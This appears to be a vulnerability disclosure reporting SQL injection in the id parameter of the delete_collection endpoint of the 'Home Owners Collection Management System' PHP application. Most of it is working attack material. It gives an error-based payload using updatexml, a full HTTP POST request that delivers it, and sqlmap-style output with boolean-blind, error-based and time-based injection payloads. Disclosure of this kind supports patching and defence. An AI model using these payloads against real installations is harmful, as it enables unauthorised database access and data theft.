## Home Owners Collection Management System has SQL injection vulnerability

vendor : https://www.sourcecodester.com/php/15162/home-owners-collection-management-system-phpoop-free-source-code.html

Vulnerability file: /hocms/classes/Master.php?f=delete_collection

Vulnerability location: /hocms/classes/Master.php?f=delete_collection,id

[+]Payload: id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point

```
POST /hocms/classes/Master.php?f=delete_collection HTTP/1.1
Host: 192.168.1.19
Content-Length: 64
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/hocms/admin/?page=collections
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=vfe306mj2a11p5q94440ttg4bd
Connection: close

id=1' and updatexml(1,concat(0x7e,(select version()),0x7e),0)--+ //id is Injection point
```
![image](https://user-images.githubusercontent.com/54017627/160325262-6139b46b-adf7-4df7-b5ea-81dcff04b942.png)

```sql
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1' RLIKE (SELECT (CASE WHEN (7593=7593) THEN 1 ELSE 0x28 END))-- royL

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(4089,CONCAT(0x5c,0x71716a6b71,(SELECT (ELT(4089=4089,1))),0x716b7a7071))-- bEpc

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 1072 FROM (SELECT(SLEEP(5)))JGOk)-- dtrs
---
```

![image](https://user-images.githubusercontent.com/54017627/160325346-397b80d9-c415-48d2-bedf-f52d227e908a.png)

